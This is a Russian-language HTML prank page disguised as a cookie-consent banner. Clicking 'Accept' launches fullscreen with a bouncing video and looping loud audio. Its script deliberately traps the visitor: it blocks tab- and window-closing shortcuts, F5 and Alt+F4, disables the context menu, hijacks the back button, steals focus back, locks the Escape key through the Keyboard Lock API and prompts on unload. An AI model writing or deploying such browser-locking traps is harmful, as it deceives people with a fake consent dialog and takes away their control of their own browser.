<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Согласие</title>
  <style>
    * { padding: 0; margin: 0; box-sizing: border-box; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #1a1a1a;
      color: #fff;
      font-family: system-ui, -apple-system, sans-serif;
      overflow: hidden;
    }

    .cookie-box {
      position: relative;
      z-index: 10;
      max-width: 480px;
      padding: 32px;
      background: #252525;
      border: 1px solid #333;
      border-radius: 16px;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
    }

    .cookie-box h1 { font-size: 1.4rem; margin-bottom: 12px; }
    .cookie-box p {
      font-size: 0.95rem;
      color: #aaa;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    .cookie-btn {
      display: inline-block;
      padding: 14px 40px;
      font-size: 1rem;
      font-weight: 600;
      color: #fff;
      background: linear-gradient(135deg, #00c853, #00e676);
      border: none;
      border-radius: 999px;
      cursor: pointer;
      transition: transform 0.15s ease, box-shadow 0.15s ease;
    }
    .cookie-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(0, 230, 118, 0.35);
    }
    .cookie-btn:active { transform: translateY(0); }

    #stage {
      position: fixed;
      inset: 0;
      display: none;
      z-index: 5;
      background: #000;
      overflow: hidden;
    }

    #stage .bg-layer {
      position: absolute;
      inset: 0;
      z-index: 0;
      overflow: hidden;
    }
    #stage .bg-layer img {
      width: 100%;
      height: 100%;
      object-fit: fill;
      display: block;
    }

    #stage video {
      position: fixed;
      z-index: 1;
      width: 320px;
      height: auto;
      border-radius: 12px;
      box-shadow: 0 0 60px rgba(0,0,0,0.8);
      top: 0;
      left: 0;
      pointer-events: none;
      will-change: transform;
    }
  </style>
</head>
<body>

  <div class="cookie-box" id="cookieBox">
    <h1>Мы используем cookie</h1>
    <p>Этот сайт использует файлы cookie. Нажми кнопку, чтобы согласиться.</p>
    <button class="cookie-btn" id="acceptBtn" onclick="brapp()">Принять</button>
  </div>

  <div id="stage">
    <div class="bg-layer">
      <img src="bg.gif" alt="">
    </div>
    <video id="fart" loop playsinline src="video.mp4"></video>
  </div>

  <audio id="shart"  preload="auto" loop src="sound1.mp3"></audio>
  <audio id="shart2" preload="auto" loop src="sound1.mp3"></audio>
  <audio id="shart3" preload="auto" loop src="sound2.mp3"></audio>

  <script>
    // ─── Настройки полёта видео ───
    const VIDEO_SPEED = 12;
    const TURN_CHANCE = 0.03;

    let vx = VIDEO_SPEED;
    let vy = VIDEO_SPEED;
    let vxSign = 1;
    let vySign = 1;

    // ─── 1. Подтверждение перед закрытием ───
    window.onbeforeunload = function () {
      return 'Ты уверен, что хочешь уйти?';
    };

    // ─── 2. Блокировка горячих клавиш ───
    document.addEventListener('keydown', function (e) {
      const k = e.key.toLowerCase();
      const blocked =
        (e.ctrlKey && (k === 'w' || k === 'r' || k === 't' || k === 'n')) ||
        (e.ctrlKey && e.shiftKey && k === 'w') ||
        k === 'f5' ||
        (e.altKey && k === 'f4');

      if (blocked) {
        e.preventDefault();
        e.stopPropagation();
      }
    }, { capture: true });

    // ─── 3. Блокировка контекстного меню ───
    document.addEventListener('contextmenu', function (e) {
      e.preventDefault();
    });

    // ─── 4. Блокировка кнопки «Назад» ───
    history.pushState(null, '', location.href);
    window.addEventListener('popstate', function () {
      history.pushState(null, '', location.href);
    });

    // ─── 5. Удержание фокуса ───
    window.addEventListener('blur', function () {
      setTimeout(() => window.focus(), 10);
    });

    // ─── 6. Fullscreen: один вызов по клику ───
    function requestFullscreenSafe() {
      const el = document.documentElement;
      if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
        try {
          if (el.requestFullscreen) el.requestFullscreen();
          else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
          else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
        } catch (e) { /* браузер запретил — игнорируем */ }
      }
    }

    // ─── 7. Keyboard Lock API — блокировка Esc в fullscreen ───
    const supportsKeyboardLock =
      ('keyboard' in navigator) && ('lock' in navigator.keyboard);

    if (supportsKeyboardLock) {
      document.addEventListener('fullscreenchange', async () => {
        if (document.fullscreenElement) {
          try {
            await navigator.keyboard.lock(['Escape']);
            console.log('Escape заблокирован в fullscreen');
          } catch (e) {
            console.warn('Не удалось заблокировать Esc:', e);
          }
        } else {
          try {
            navigator.keyboard.unlock();
            console.log('Клавиатура разблокирована');
          } catch (e) {}
        }
      });
    } else {
      console.log('Keyboard Lock API не поддерживается этим браузером');
    }

    // ─── Главная логика ───
    function brapp() {
      // Fullscreen — по клику, один раз
      requestFullscreenSafe();

      // Убираем cookie-блок
      const box = document.getElementById('cookieBox');
      if (box) box.remove();

      // Показываем сцену
      const stage = document.getElementById('stage');
      stage.style.display = 'block';

      // Видео + полёт
      const video = document.getElementById('fart');
      if (video) {
        video.play().catch(() => {});
        startFlying(video);
      }

      // Аудио
      ['shart', 'shart2', 'shart3'].forEach(id => {
        const a = document.getElementById(id);
        if (a) a.play().catch(() => {});
      });
    }

    // ─── Полёт видео ───
    function startFlying(el) {
      let x = (window.innerWidth  - el.offsetWidth)  / 2;
      let y = (window.innerHeight - el.offsetHeight) / 2;

      vxSign = Math.random() < 0.5 ? -1 : 1;
      vySign = Math.random() < 0.5 ? -1 : 1;

      function step() {
        if (Math.random() < TURN_CHANCE) vxSign *= -1;
        if (Math.random() < TURN_CHANCE) vySign *= -1;

        x += vx * vxSign;
        y += vy * vySign;

        const maxX = window.innerWidth  - el.offsetWidth;
        const maxY = window.innerHeight - el.offsetHeight;

        if (x <= 0)    { x = 0;    vxSign = 1;  }
        if (x >= maxX) { x = maxX; vxSign = -1; }
        if (y <= 0)    { y = 0;    vySign = 1;  }
        if (y >= maxY) { y = maxY; vySign = -1; }

        el.style.transform = `translate(${x}px, ${y}px)`;

        requestAnimationFrame(step);
      }

      step();
    }
  </script>

</body>
</html>
